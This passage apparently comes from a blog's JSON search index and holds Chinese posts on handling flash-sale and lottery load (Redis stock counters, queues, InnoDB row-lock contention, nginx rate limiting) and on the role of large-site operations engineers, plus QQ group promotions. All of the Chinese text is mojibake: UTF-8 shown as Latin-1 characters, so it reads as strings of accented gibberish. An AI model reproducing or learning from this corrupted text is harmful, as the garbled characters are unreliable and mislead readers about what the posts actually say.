-1ã€‚æœ€åè¿™ä¸ª-1æ“ä½œæ˜¯ä¸èƒ½å‡ºç°è´Ÿæ•°çš„ï¼Œä½†æ˜¯å½“å¤šç”¨æˆ·åœ¨æœ‰åº“å­˜çš„æƒ…å†µä¸‹å¹¶å‘æ“ä½œï¼Œå‡ºç°è´Ÿæ•°è¿™æ˜¯æ— æ³•é¿å…çš„ã€‚ IIIï¼šæœ€åï¼Œå½“å‡åº“å­˜å’Œé«˜å¹¶å‘ç¢°åˆ°ä¸€èµ·çš„æ—¶å€™ï¼Œç”±äºæ“ä½œçš„åº“å­˜æ•°ç›®åœ¨åŒä¸€è¡Œï¼Œå°±ä¼šå‡ºç°äº‰æŠ¢InnoDBè¡Œé”çš„é—®é¢˜ï¼Œå¯¼è‡´å‡ºç°äº’ç›¸ç­‰å¾…ç”šè‡³æ­»é”ï¼Œä»è€Œå¤§å¤§é™ä½MySQLçš„å¤„ç†æ€§èƒ½ï¼Œæœ€ç»ˆå¯¼è‡´å‰ç«¯é¡µé¢å‡ºç°è¶…æ—¶å¼‚å¸¸ã€‚ è¿™ä¸ªæœ‰é‡åˆ°è¿‡çš„ï¼Œå°±æ˜¯é”è¡¨å¯¼è‡´è®¿é—®å‡ºç°ç½‘ç»œå¼‚å¸¸ã€‚ é’ˆå¯¹ä¸Šè¿°é—®é¢˜ï¼Œå¦‚ä½•è§£å†³å‘¢ï¼Ÿ æˆ‘ä»¬å…ˆçœ‹çœ¼æ·˜å®çš„é«˜å¤§ä¸Šè§£å†³æ–¹æ¡ˆï¼š 123Iï¼šå…³é—­æ­»é”æ£€æµ‹ï¼Œæé«˜å¹¶å‘å¤„ç†æ€§èƒ½ã€‚IIï¼šä¿®æ”¹æºä»£ç ï¼Œå°†æ’é˜Ÿæåˆ°è¿›å…¥å¼•æ“å±‚å‰ï¼Œé™ä½å¼•æ“å±‚é¢çš„å¹¶å‘åº¦ã€‚IIIï¼šç»„æäº¤ï¼Œé™ä½serverå’Œå¼•æ“çš„äº¤äº’æ¬¡æ•°ï¼Œé™ä½IOæ¶ˆè€—ã€‚ è§£å†³æ–¹æ¡ˆ1ï¼šå°†å­˜åº“ä»MySQLå‰ç§»åˆ°Redisä¸­ï¼Œæ‰€æœ‰çš„å†™æ“ä½œæ”¾åˆ°å†…å­˜ä¸­ï¼Œç”±äºRedisä¸­ä¸å­˜åœ¨é”æ•…ä¸ä¼šå‡ºç°äº’ç›¸ç­‰å¾…ï¼Œå¹¶ä¸”ç”±äºRedisçš„å†™æ€§èƒ½å’Œè¯»æ€§èƒ½éƒ½è¿œé«˜äºMySQLï¼Œè¿™å°±è§£å†³äº†é«˜å¹¶å‘ä¸‹çš„æ€§èƒ½é—®é¢˜ã€‚ç„¶åé€šè¿‡é˜Ÿåˆ—ç­‰å¼‚æ­¥æ‰‹æ®µï¼Œå°†å˜åŒ–çš„æ•°æ®å¼‚æ­¥å†™å…¥åˆ°DBä¸­ã€‚ ä¼˜ç‚¹ï¼šè§£å†³æ€§èƒ½é—®é¢˜ç¼ºç‚¹ï¼šæ²¡æœ‰è§£å†³è¶…å–é—®é¢˜ï¼ŒåŒæ—¶ç”±äºå¼‚æ­¥å†™å…¥DBï¼Œå­˜åœ¨æŸä¸€æ—¶åˆ»DBå’ŒRedisä¸­æ•°æ®ä¸ä¸€è‡´çš„é£é™©ã€‚ è§£å†³æ–¹æ¡ˆ2ï¼šå¼•å…¥é˜Ÿåˆ—ï¼Œç„¶åå°†æ‰€æœ‰å†™DBæ“ä½œåœ¨å•é˜Ÿåˆ—ä¸­æ’é˜Ÿï¼Œå®Œå…¨ä¸²è¡Œå¤„ç†ã€‚å½“è¾¾åˆ°åº“å­˜é˜€å€¼çš„æ—¶å€™å°±ä¸åœ¨æ¶ˆè´¹é˜Ÿåˆ—ï¼Œå¹¶å…³é—­è´­ä¹°åŠŸèƒ½ã€‚è¿™å°±è§£å†³äº†è¶…å–é—®é¢˜ã€‚ ä¼˜ç‚¹ï¼šè§£å†³è¶…å–é—®é¢˜ï¼Œç•¥å¾®æå‡æ€§èƒ½ã€‚ç¼ºç‚¹ï¼šæ€§èƒ½å—é™äºé˜Ÿåˆ—å¤„ç†æœºå¤„ç†æ€§èƒ½å’ŒDBçš„å†™å…¥æ€§èƒ½ä¸­æœ€çŸ­çš„é‚£ä¸ªï¼Œå¦å¤–å¤šå•†å“åŒæ—¶æŠ¢è´­çš„æ—¶å€™éœ€è¦å‡†å¤‡å¤šæ¡é˜Ÿåˆ—ã€‚ è§£å†³æ–¹æ¡ˆ3ï¼šå°†å†™æ“ä½œå‰ç§»åˆ°MCä¸­ï¼ŒåŒæ—¶åˆ©ç”¨MCçš„è½»é‡çº§çš„é”æœºåˆ¶CASæ¥å®ç°å‡åº“å­˜æ“ä½œã€‚ä¼˜ç‚¹ï¼šè¯»å†™åœ¨å†…å­˜ä¸­ï¼Œæ“ä½œæ€§èƒ½å¿«ï¼Œå¼•å…¥è½»é‡çº§é”ä¹‹åå¯ä»¥ä¿è¯åŒä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ªå†™å…¥æˆåŠŸï¼Œè§£å†³å‡åº“å­˜é—®é¢˜ã€‚ç¼ºç‚¹ï¼šæ²¡æœ‰å®æµ‹ï¼ŒåŸºäºCASçš„ç‰¹æ€§ä¸çŸ¥é“é«˜å¹¶å‘ä¸‹æ˜¯å¦ä¼šå‡ºç°å¤§é‡æ›´æ–°å¤±è´¥ï¼Ÿä¸è¿‡åŠ é”ä¹‹åè‚¯å®šå¯¹å¹¶å‘æ€§èƒ½ä¼šæœ‰å½±å“ã€‚ è§£å†³æ–¹æ¡ˆ4ï¼šå°†æäº¤æ“ä½œå˜æˆä¸¤æ®µå¼ï¼Œå…ˆç”³è¯·åç¡®è®¤ã€‚ç„¶ååˆ©ç”¨Redisçš„åŸå­è‡ªå¢æ“ä½œï¼ˆç›¸æ¯”è¾ƒMySQLçš„è‡ªå¢æ¥è¯´æ²¡æœ‰ç©ºæ´ï¼‰ï¼ŒåŒæ—¶åˆ©ç”¨Redisçš„äº‹åŠ¡ç‰¹æ€§æ¥å‘å·ï¼Œä¿è¯æ‹¿åˆ°å°äºç­‰äºåº“å­˜é˜€å€¼çš„å·çš„äººéƒ½å¯ä»¥æˆåŠŸæäº¤è®¢å•ã€‚ç„¶åæ•°æ®å¼‚æ­¥æ›´æ–°åˆ°DBä¸­ã€‚ ä¼˜ç‚¹ï¼šè§£å†³è¶…å–é—®é¢˜ï¼Œåº“å­˜è¯»å†™éƒ½åœ¨å†…å­˜ä¸­ï¼Œæ•…åŒæ—¶è§£å†³æ€§èƒ½é—®é¢˜ã€‚ç¼ºç‚¹ï¼šç”±äºå¼‚æ­¥å†™å…¥DBï¼Œå¯èƒ½å­˜åœ¨æ•°æ®ä¸ä¸€è‡´ã€‚å¦å¯èƒ½å­˜åœ¨å°‘ä¹°ï¼Œä¹Ÿå°±æ˜¯å¦‚æœæ‹¿åˆ°å·çš„äººä¸çœŸæ­£ä¸‹è®¢å•ï¼Œå¯èƒ½åº“å­˜å‡ä¸º0ï¼Œä½†æ˜¯è®¢å•æ•°å¹¶æ²¡æœ‰è¾¾åˆ°åº“å­˜é˜€å€¼ã€‚ ä¸‰ã€æ€»ç»“ 121ã€å‰ç«¯ä¸‰æ¿æ–§ã€æ‰©å®¹ã€‘ã€é™æµã€‘ã€é™æ€åŒ–ã€‘2ã€åç«¯ä¸¤æ¡è·¯ã€å†…å­˜ã€‘+ã€æ’é˜Ÿã€‘ æµ‹è¯•æ€»ç»“ç»éªŒç¬¬ä¸€æ¬¡åšæŠ½å¥–æ´»åŠ¨ï¼Œæµ‹è¯•é‚£è¾¹æµ‹è¯•å‡ºå¾ˆå¤šé—®é¢˜ã€‚ ä¸‹é¢æ˜¯é‡åˆ°çš„é—®é¢˜ã€‚ 12345æµ‹è¯•ç¬¬ä¸€æ¬¡: è®¿é—®å‹æµ‹å‡ºç°äº†è®¿é—®ç™½å±ã€‚å®šä½ï¼šä»£ç å†™çš„æœ‰é—®é¢˜ã€‚ tomcatéœ€è¦åšä¼˜åŒ–ã€‚ æˆ‘ä»¬ä¸€èˆ¬ç”¨æˆ·é‡ç²‰ä¸åœ¨100Wæµ‹è¯•ç¬¬äºŒæ¬¡ï¼š å‡ºç°æ•°æ®åº“CPUç“¶é¢ˆè¿‡é«˜ã€‚ä¸»ä»åŒæ­¥ï¼Œç„¶ååšäº†æ•°æ®åº“è¯»å†™åˆ†ç¦»ï¼Œ redisé›†ç¾¤ç¼“å­˜ã€‚ æœ€ä¸»è¦æ˜¯æ•°æ®åº“SQLè¯­å¥åšäº†ä¼˜åŒ–ã€‚ä¼˜åŒ–äº†æå‡äº†å¾ˆå¤§ä¸€éƒ¨åˆ†ã€‚æµ‹è¯•ç¬¬ä¸‰æ¬¡ï¼šè¿˜æœ‰å‡ºç°äº†503è®¿é—®å—é™äº†ã€‚ åé¢åšäº†nginxä»£ç† é˜²æ­¢åŒä¸€ä¸ªIPåŒä¸€ä¸ªæ—¶é—´è¶…è¿‡å¤šå°‘æ¬¡å»è¯·æ±‚ï¼Œä¼šè¢«å—é™ã€‚ ä¸è¿‡è¿™ä¸ªåšDDOSæ”»å‡» æœ‰å¾ˆå¤§ä¸€éƒ¨åˆ†å½±å“ç”¨æˆ·åä½“éªŒåº¦ã€‚ å››ã€éæŠ€æœ¯æ„Ÿæƒ³1ã€å›¢é˜Ÿçš„åŠ›é‡æ˜¯æ— ç©·çš„ï¼Œå„ç§å„æ ·çš„è§£å†³æ–¹æ¡ˆï¼ˆå…ˆä¸è°ˆå¯è¡Œæ€§ï¼‰éƒ½æ˜¯åœ¨å°ä¼™ä¼´ä»¬ä¸ƒå˜´å…«èˆŒä¸­è®¨è®ºå‡ºæ¥çš„ã€‚æˆ‘ä»¬éœ€è¦è®©æ‰€æœ‰äººéƒ½å‘å‡ºè‡ªå·±çš„å£°éŸ³ï¼Œä¸è¦ç€æ€¥å»å¦å®šã€‚2ã€ä¼˜åŒ–éœ€è¦ä»æ•´ä½“å±‚é¢å»æ€è€ƒï¼Œä¸è¦åªçº ç»“äºè‡ªå·±è´Ÿè´£çš„éƒ¨åˆ†ï¼Œå¦‚æœåªç›¯ç€ä¸€ä¸ªç‚¹æ€è€ƒï¼Œæœ€åå¾ˆå¯èƒ½å°±èµ°è¿›æ­»èƒ¡åŒä¸­äº†ã€‚3ã€æœ‰å¾ˆå¤šä¸œè¥¿ä»¥ä¸ºè¯»è¿‡äº†å°±æ‡‚äº†ï¼Œå…¶å®ä¸ç„¶ã€‚ä¾ç„¶è¿˜æ˜¯éœ€è¦å®è·µï¼Œå¦åˆ™åˆ«äººçš„çŸ¥è¯†æ°¸è¿œä¸å¯èƒ½å˜æˆè‡ªå·±çš„ã€‚4ã€å¤šæ€è€ƒä¸ºä»€ä¹ˆï¼Œä¼šå‘ç”Ÿä»€ä¹ˆï¼Œä¸è¦æƒ³å½“ç„¶ã€‚åªæœ‰è¿™æ ·æ‰èƒ½æ·±å…¥è¿›å»ï¼Œè€Œä¸æ˜¯ç•™åœ¨è¡¨é¢ã€‚ äº¤æµå­¦ä¹ ï¼šğŸ§ Linux shell_é«˜çº§è¿ç»´æ´¾: 459096184 åœˆå­ (ç³»ç»Ÿè¿ç»´-åº”ç”¨è¿ç»´-è‡ªåŠ¨åŒ–è¿ç»´-è™šæ‹ŸåŒ–æŠ€æœ¯ç ”ç©¶æ¬¢è¿åŠ å…¥)ğŸ§ BigData-Exchange School : 521621407 åœˆå­ï¼ˆå¤§æ•°æ®è¿ç»´)ï¼ˆHadoopå¼€å‘äººå‘˜)ï¼ˆå¤§æ•°æ®ç ”ç©¶çˆ±å¥½è€…) æ¬¢è¿åŠ å…¥ ç›¸åº”Bidataæœ‰å†…éƒ¨å¾®ä¿¡äº¤æµç¾¤äº’ç›¸å­¦ä¹ ï¼ŒåŠ å…¥QQç¾¤æœ‰é“¾æ¥ã€‚","link":"/2016/11/10/è¿ç»´ç¬”è®°/å¦‚ä½•è§£å†³æŠ½å¥–çš„æ€§èƒ½é—®é¢˜å’Œç§’æ€çš„è®¨è®º  /"},{"title":"è¿ç»´å·¥ç¨‹å¸ˆçš„èŒè´£å’Œå‰æ™¯","text":"è¿ç»´å·¥ç¨‹å¸ˆçš„èŒè´£å’Œå‰æ™¯è¿ç»´ä¸­å…³é”®æŠ€æœ¯ç‚¹è§£å‰–ï¼š 123451 å¤§é‡é«˜å¹¶å‘ç½‘ç«™çš„è®¾è®¡æ–¹æ¡ˆ ï¼›2 é«˜å¯é ã€é«˜å¯ä¼¸ç¼©æ€§ç½‘ç»œæ¶æ„è®¾è®¡ï¼›3 ç½‘ç«™å®‰å…¨é—®é¢˜ï¼Œå¦‚ä½•é¿å…è¢«é»‘ï¼Ÿ4 å—åŒ—äº’è”é—®é¢˜,åŠ¨æ€CDNè§£å†³æ–¹æ¡ˆï¼›5 æµ·é‡æ•°æ®å­˜å‚¨æ¶æ„ ä¸€ã€ä»€ä¹ˆæ˜¯å¤§å‹ç½‘ç«™è¿ç»´ï¼Ÿé¦–å…ˆæ˜ç¡®ä¸€ä¸‹ï¼Œå…¨æ–‡æ‰€è®²çš„â€è¿ç»´â€œæ˜¯æŒ‡ï¼šå¤§å‹ç½‘ç«™è¿ç»´ï¼Œä¸å…¶å®ƒè¿ç»´çš„åŒºåˆ«è¿˜æ˜¯è›®å¤§çš„ï¼›ç„¶åæˆ‘ä»¬å†å¯¹å¤§å‹ç½‘ç«™ä¸å°å‹ç½‘ç«™è¿›è¡ŒèŒƒå›´å®šä¹‰ï¼Œæ­¤å®šä¹‰ä¸»è¦ä»è¿ç»´å¤æ‚æ€§è§’åº¦è€ƒè™‘ï¼Œå¦‚ç½‘ç«™è§„èŒƒã€çŸ¥ååº¦ã€æœåŠ¡å™¨é‡çº§ã€pvé‡ç­‰è€ƒè™‘ï¼Œå…¶å®ƒå› ç´ ä¸æ˜¯é‡ç‚¹ï¼› å› æ­¤ï¼Œæˆ‘ä»¬å…ˆå®šä¹‰æœåŠ¡å™¨è§„æ¨¡å¤§äº1000å°ï¼Œpvæ¯å¤©è‡³å°‘ä¸Šäº¿ï¼ˆè‡³å°‘å›½å†…æ’åå‰10ï¼‰ï¼Œå¦‚sinaã€baiduã€QQï¼Œ51.comç­‰ç­‰ï¼› å…¶å®ƒå°å‹ç½‘ç«™å¯èƒ½æ²¡æœ‰çœŸæ­£æ„ä¹‰ä¸Šçš„è¿ç»´å·¥ç¨‹å¸ˆï¼Œè¿™ä¸ç½‘ç«™è§„èŒƒä¸å¤Ÿå’Œæˆæœ¬å› ç´ æœ‰å…³ï¼Œæ›´å¤šçš„æ˜¯é›†åˆç½‘ç»œã€ç³»ç»Ÿã€å¼€å‘å·¥ä½œäºä¸€èº«çš„â€œå¤åˆæ€§äººæ‰â€ï¼Œå°±å¦‚æœ‰äº›å…¬å¸æŠŠä¸€äº›åˆåŒé‡‡è´­éƒ½çº³å…¥äº†è¿ç»´èŒè´£èŒƒå›´ï¼Œè¿˜æœ‰å¦‚IDCç½‘ç»œè§„åˆ’ä¹Ÿçº³å…¥è¿ç»´èŒè´£ã€‚æ‰€ä»¥ï¼Œéå¸¸é‡è¦ä¸€å®šéœ€è¦æ˜ç™½ï¼š 1è¿ç»´å¯¹å…¶å®ƒå…³è”å·¥ç§å¿…é¡»éå¸¸äº†è§£ç†Ÿæ‚‰ï¼šç½‘ç»œã€ç³»ç»Ÿã€ç³»ç»Ÿå¼€å‘ã€å­˜å‚¨ï¼Œå®‰å…¨,DBç­‰ï¼› æˆ‘åœ¨è¿™é‡Œæ‰€è®²çš„è¿ç»´å·¥ç¨‹å¸ˆå°±æ˜¯æŒ‡ä¸“èŒè¿ç»´å·¥ç¨‹å¸ˆã€‚æˆ‘ä»¬å†æ¥è¯´è¯´ä¸€èˆ¬äº§å“çš„â€œå‡ºç”Ÿâ€æµç¨‹ï¼š 12345671ã€é¦–å…ˆå…¬å¸ç®¡ç†å±‚ç»™å‡ºæŒ‡å¯¼æ€æƒ³ï¼ŒPMå®šä½å¸‚åœºéœ€æ±‚ï¼ˆæˆ–copyæˆç†Ÿåº”ç”¨ï¼‰è¿›è¡Œè°ƒç ”ã€åˆ†æã€æœ€ç»ˆç»™å‡ºè¯¦ç»†è®¾è®¡ã€‚2ã€æ¶æ„å¸ˆæ ¹æ®äº§å“è®¾è®¡çš„éœ€æ±‚ï¼Œå¦‚pvå¤§å°é¢„ä¼°ã€æœåŠ¡å™¨è§„æ¨¡ã€åº”ç”¨æ¶æ„ç­‰å› ç´ å®Œæˆç½‘ç»œè§„åˆ’,æ¶æ„è®¾è®¡ç­‰ï¼ˆåŸºæœ¬ä¸Šå¯¹ç½‘ç»œå˜åŠ¨ä¸å¤§ï¼Œé™¤éå¤§é¡¹ç›®ï¼‰3ã€å¼€å‘å·¥ç¨‹å¸ˆå°†è®¾è®¡codeå®ç°å‡ºæ¥ã€æµ‹è¯•å·¥ç¨‹å¸ˆå¯¹åº”ç”¨è¿›è¡Œæµ‹è¯•ã€‚4ã€å¥½ï¼Œåˆ°è¿ç»´å·¥ç¨‹å¸ˆå‡ºé©¬äº†ï¼Œé¦–å…ˆæ˜ç¡®ä¸€ç‚¹ä¸æ˜¯è¯´å‰ä¸‰æ­¥å°±ä¸è¿ç»´å·¥ä½œæ— å…³äº†ï¼Œæ°æ°ç›¸åï¼Œå‰ä¸‰æ­¥ä¸è¿ç»´å…³ç³»å¾ˆå¤§ï¼š åº”ç”¨çš„å‰æœŸæ¶æ„è®¾è®¡ã€è½¯/ç¡¬ä»¶èµ„æºè¯„ä¼°ç”³è¯·é‡‡è´­ã€åº”ç”¨è®¾è®¡æ€§èƒ½éšæ‚£åŠè¯„ä¼°ã€IDCã€æœåŠ¡æ€§èƒ½å®‰å…¨è°ƒä¼˜ã€æœåŠ¡å™¨ç³»ç»Ÿçº§ä¼˜åŒ–ï¼ˆä¸ç‰¹å®šåº”ç”¨æœ‰å…³ï¼‰ç­‰éƒ½éœ€è¿ç»´å…¨ç¨‹å‚ä¸ï¼Œå¹¶ä¸»å¯¼æ•´ä¸ªåº”ç”¨ä¸Šçº¿é¡¹ç›®ï¼›è¿ç»´å·¥ç¨‹å¸ˆè´Ÿè´£äº§å“æœåŠ¡å™¨ä¸Šæ¶å‡†å¤‡å·¥ä½œï¼ŒæœåŠ¡å™¨ç³»ç»Ÿå®‰è£…ã€ç½‘ç»œã€IPã€é€šç”¨å·¥å…·é›†å®‰è£…ã€‚è¿ç»´å·¥ç¨‹å¸ˆè¿˜éœ€è¦å¯¹ä¸Šçº¿çš„åº”ç”¨ç³»ç»Ÿæ¶æ„æ˜¯å¦åˆç†ã€æ˜¯å¦å…·å¤‡å¯æ‰©å±•æ€§ã€åŠå®‰å…¨éšæ‚£ç­‰å› ç´ è´Ÿè´£ï¼Œå¹¶è´Ÿè´£æœ€åå°†äº§å“ï¼ˆç¨‹åºï¼‰ã€ç½‘ç»œã€ç³»ç»Ÿä¸‰è€…è¿›è¡Œæ‹¼æ¥å¹¶æœ€ä¼˜åŒ–çš„ç»„åˆåœ¨ä¸€èµ·ï¼Œæœ€ç»ˆå®Œæˆäº§å“ä¸Šçº¿æä¾›ç”¨æˆ·ä½¿ç”¨ï¼Œå¹¶å‘¨è€Œå¤ä½¿ï¼šéœ€æ±‚-&gt;å¼€å‘ï¼ˆå‡çº§ï¼‰-&gt;æµ‹è¯•-&gt;ä¸Šçº¿ï¼ˆæ€§èƒ½ã€å®‰å…¨é—®é¢˜ç­‰ä¹‹å‰é¢„ä¼°å¤–çš„é—®é¢˜éšä¹‹æ…¢æ…¢å°±å…¨å‡ºæ¥äº†ï¼‰åœ¨è¿™é‡Œæä¸€ç‚¹ï¼šç½‘ç«™å¼€å‘æ¨¡å¼ä¸ä¼ ç»Ÿè½¯ä»¶å¼€å‘å®Œå…¨ä¸ä¸€æ ·ï¼Œç½‘ç«™ä¸€å¤©å¼€å‘ä¸Šçº¿1~5ä¸ªå‡çº§ç‰ˆæœ¬æ˜¯å®¶å¸¸ä¾¿é¥­ï¼Œç”¨æˆ·ä½“éªŒä¸ºç‹å˜›ï¼Œå¦‚æœæŸä¸ªçº¿ä¸Šé—®é¢˜åƒM$éœ€è¦1å¹´è§£å†³ï¼Œç”¨æˆ·æ—©è·‘å…‰äº†ï¼›åº”ç”¨ä¸Šçº¿åï¼Œè¿ç»´å·¥ä½œæ‰åˆšå¼€å§‹ï¼Œå…·ä½“å·¥ä½œå¯èƒ½åŒ…æ‹¬ï¼š å‡çº§ç‰ˆæœ¬ä¸Šçº¿å·¥ä½œã€æœåŠ¡ç›‘æ§ã€åº”ç”¨çŠ¶æ€ç»Ÿè®¡ã€æ—¥å¸¸æœåŠ¡çŠ¶æ€å·¡æ£€ã€çªå‘æ•…éšœå¤„ç†ã€æœåŠ¡æ—¥å¸¸å˜æ›´è°ƒæ•´ã€é›†ç¾¤ç®¡ç†ã€æœåŠ¡æ€§èƒ½è¯„ä¼°ä¼˜åŒ–ã€æ•°æ®åº“ç®¡ç†ä¼˜åŒ–ã€éšç€åº”ç”¨PVå¢å‡è¿›è¡Œåº”ç”¨æ¶æ„çš„ä¼¸ç¼©ã€å®‰å…¨ã€è¿ç»´å¼€å‘å·¥ä½œï¼š 1234a ã€å°½é‡å°†æ—¥å¸¸æœºæ¢°æ€§æ‰‹å·¥å·¥ä½œé€šè¿‡å·¥å…·å®ç°ï¼ˆå¦‚æœåŠ¡ç›‘æ§ã€åº”ç”¨çŠ¶æ€ç»Ÿè®¡ã€æœåŠ¡ä¸Šçº¿ç­‰ç­‰ï¼‰ï¼Œæé«˜æ•ˆç‡ã€‚bã€è§£å†³ç°å®ä¸­æœåŠ¡å­˜åœ¨çš„é—®é¢˜ï¼Œå¦‚é«˜å¯é æ€§ã€å¯æ‰©å±•æ€§é—®é¢˜ç­‰ã€‚cã€å¤§è§„æ¨¡é›†ç¾¤ç®¡ç†å·¥å…·çš„å¼€å‘ï¼Œå¦‚1ä¸‡å°æœºå™¨å¦‚ä½•åœ¨1åˆ†é’Ÿå†…å®Œæˆå¯†ç ä¿®æ”¹ã€æˆ–è¿è¡ŒæŒ‡å®šä»»åŠ¡ï¼Ÿ2000å°æœåŠ¡å™¨å¦‚ä½•å¿«é€Ÿå®‰è£…æ“ä½œç³»ç»Ÿï¼Ÿå„åˆ†å¸ƒå¼IDCã€å­˜å‚¨é›†ç¾¤ä¸­æ•°PTçº§çš„æ•°æ®å¦‚ä½•å¿«é€Ÿçš„å­˜å‚¨ã€å…±äº«ã€åˆ†æï¼Ÿç­‰ä¸€ç³»åˆ—æŒ‘æˆ˜éƒ½éœ€è¿ç»´å·¥ç¨‹å¸ˆçš„åŠªåŠ›ã€‚åœ¨æ­¤è¯´æ˜ä¸€ä¸‹å…¶å®ƒé…åˆå·¥ç§æƒ…å†µï¼Œåœ¨æ•´ä¸ªé¡¹ç›®ä¸­ï¼Œå‰ç«¯åº”ç”¨å¯¹äºç½‘ç»œ/ç³»ç»Ÿå·¥ç¨‹å¸ˆæ¥è¯´æ˜¯é»‘åŒ£å­ï¼ŒåŒæ—¶å¼€å‘å·¥ç¨‹å¸ˆèŒè´£åªæ˜¯è´Ÿè´£å®Œæˆåº”ç”¨çš„åŠŸèƒ½æ€§å¼€å‘ï¼Œå¹¶å¯¹åº”ç”¨æœ¬èº«æ€§èƒ½ã€å®‰å…¨æ€§ç­‰åº”ç”¨æœ¬èº«è´Ÿè´£ï¼Œå®ƒä¸è´Ÿè´£æˆ–å…³å¿ƒç½‘ç»œ/ç³»ç»Ÿæ¶æ„æ–¹é¢äº‹å®œï¼Œå½“ç„¶è½¯/ç¡¬ä»¶é‡‡è´­äººå‘˜ç­‰äº‹ä¸šéƒ¨å…¶å®ƒåŒäº‹ä¹Ÿä¸ä¼šå…³å¿ƒè¿™äº›é—®é¢˜ï¼Œå„å¸å…¶èŒï¼Œä½†é¡¹ç›®çš„æ ¸å¿ƒæ˜¯è¿ç»´å·¥ç¨‹å¸ˆ~ï¼æ‰€æœ‰å…¶å®ƒéƒ¨é—¨çš„æ¡¥æ¢ã€‚ ä¸¾ä¾‹ï¼šä¸Šé¢è¯´äº†å¾ˆå¤šï¼Œæˆ‘æƒ³å¤§å®¶åº”è¯¥å¯¹è¿ç»´æœ‰ä¸€äº›æ¦‚å¿µäº†ï¼Œåœ¨æ­¤æ‰“ä¸ªæ¯”æ–¹å§ï¼Œå¦‚æœæˆ‘ä»¬æ˜¯ä¸€è¾†é«˜é€Ÿè¡Œé©¶åœ¨é«˜é€Ÿå…¬è·¯ä¸Šçš„æ±½è½¦ï¼Œé‚£è¿ç»´å·¥ç¨‹å¸ˆå°±æ˜¯å¸æœºå…¼ç»´ä¿®å·¥ï¼Œè¿™ä¸ªå¸æœºä¸ç®€å•ï¼Œæœ‰æ—¶éœ€è¦åœ¨é«˜é€Ÿè¡Œé©¶è¿‡ç¨‹ä¸­æ¢è½®èƒã€å¹¶æ ¹æ®é“è·¯æƒ…å†µæ¢æ¡£ä½ã€å½“æ±½è½¦é€Ÿåº¦è¶Šæ¥è¶Šå¿«ï¼Œæ±½è½¦æœ¬èº«ä¸èƒ½æ»¡è¶³é«˜é€Ÿåº¦æ—¶å¯¹æ±½è½¦æ€§èƒ½è°ƒä¼˜æˆ–é›¶ä»¶å‡çº§ã€é«˜é€Ÿè¡Œè¿›ä¸­è§£å†³æ±½è½¦æ•…éšœåŠæ€§èƒ½é—®é¢˜ã€æ—¶åˆ»å…³æ³¨å‰æ–¹å®‰å…¨é—®é¢˜ï¼Œå¹¶å…ˆçŸ¥å…ˆè§‰çš„é‡‡å–è§„é¿æ‰‹æ®µã€‚è¿™å°±æ˜¯è¿ç»´å·¥ä½œ~ï¼ æœ€åè¯´ä¸€ä¸‹è¿ç»´å·¥ç¨‹å¸ˆçš„èŒè´£ï¼šâ€ç¡®ä¿çº¿ä¸Šç¨³å®šâ€œï¼Œçœ‹ä¼¼ç®€å•ï¼Œä½†å®å±ä¸å®¹æ˜“ï¼Œè¿ç»´å·¥ç¨‹å¸ˆå¿…é¡»åœ¨è¯¸å¤šä¸åˆ©å› ç´ ä¸­è¿›è¡Œæƒè¡¡ï¼šæ–°äº§å“æ¨¡å¼å¯¹ç°æœ‰æ¶æ„åŠæŠ€æœ¯çš„å†²å‡»ã€äº§å“é«˜é¢‘åº¦çš„å‡çº§å¸¦æ¥çš„çº¿ä¸ŠBUGéšæ‚£ã€è¿ç»´è‡ªåŠ¨åŒ–ç®¡ç†æ‰¿åº¦ä¸é«˜å¯¼è‡´çš„äººä¸ºå¤±è¯¯ã€ITè¡Œä¸šè¿½æ±‚çš„é«˜æ•ˆç‡å¯¼è‡´æµç¨‹æ‰§è¡Œä¸Šçš„ç¼ºå¤±ã€ç”¨æˆ·å¢æ¶¨å¸¦æ¥çš„æ€§èƒ½åŠæ¶æ„ä¸Šçš„å‹åŠ›ã€ITè¡Œä¸šå®½æ¾çš„æŠ€æœ¯ç®¡ç†æ–‡åŒ–ã€åˆ›æ–°é£é™©ã€äº’è”ç½‘å®‰å…¨æ€§é—®é¢˜ç­‰å› ç´ ï¼Œéƒ½ä¼šæ˜¯ç½‘ç«™ç¨³å®šçš„å¤§æ•Œï¼Œè¿ç»´å·¥ç¨‹å¸ˆå¿…é¡»æŠŠæ§å¥½è¿™æœ€åä¸€å…³ï¼Œéœ€å…·ä½“é«˜åº¦çš„è´£ä»»æ„Ÿã€åŸåˆ™æ€§åŠåè°ƒèƒ½åŠ›ï¼Œå¦‚æœèƒ½åšåˆ°å„å› ç´ çš„æœ€ä½³å¹³è¡¡ï¼Œé‚£å°±æ˜¯ä¸€åä¼˜ç§€çš„è¿ç»´å·¥ç¨‹å¸ˆäº†ã€‚ å¦å¤–åœ¨æ­¤èŠç‚¹é¢˜å¤–è¯ï¼Œæˆ‘åœ¨è¿™é‡Œçœ‹åˆ°æœ‰å¾ˆå¤šäººè¦sinaã€QQã€baidu,51.comç­‰èŠè‡ªå·²çš„è¿ç»´æ–¹é¢çš„ç»éªŒï¼Œå…¶å®è¿™å¯¹äºå®ƒä»¬æœ‰ç‚¹å…ä¸ºå…¶éš¾ï¼š aã€å„å…¬å¸è‡ªå·²ç½‘ç»œæ¶æ„ã€è§„æ¨¡ã€æˆ–å¤šæˆ–å°‘è¿˜ç®—æ˜¯å…¬å¸çš„æ ¸å¿ƒç§˜å¯†ï¼Œè¦ä¿å¯†ï¼Œå¦å¤–ï¼Œå¯¹äºå¤§å®¶æ‰€ç†ŸçŸ¥çš„é€šç”¨è½¯ä»¶ã€æ¶æ„ï¼Œç”±äºå¾ˆå¤šå…¬å¸ä¼šæ ¹æ®è‡ªå·²å®é™…ä¸šåŠ¡éœ€è¦ï¼ŒåŒæ—¶å› ä¸ºåŸç‰ˆæ€§èƒ½ã€å®‰å…¨æ€§ã€å·²çŸ¥bugã€åŠŸèƒ½ç­‰åŸå› ï¼Œè¿›è¡Œè¿‡äºŒæ¬¡å¼€å‘ï¼ˆå¦‚apache,php,mysqlï¼‰ï¼Œæ“ä½œç³»ç»Ÿå†…æ ¸ä¹Ÿä¼šæ ¹æ®ä¸åŒä¸šåŠ¡ç±»å‹è¿›è¡Œå®šåˆ¶çš„ï¼Œå¦‚æŸäº›åº”ç”¨å±äºè¿ç®—å‹ã€æŸäº›æ˜¯é«˜IOå‹ã€æˆ–å¤§å­˜å‚¨å¤§å†…å­˜å‹ã€‚æ ¹æ®è¿™äº›ç‰¹ç‚¹è¿›è¡Œå†…æ 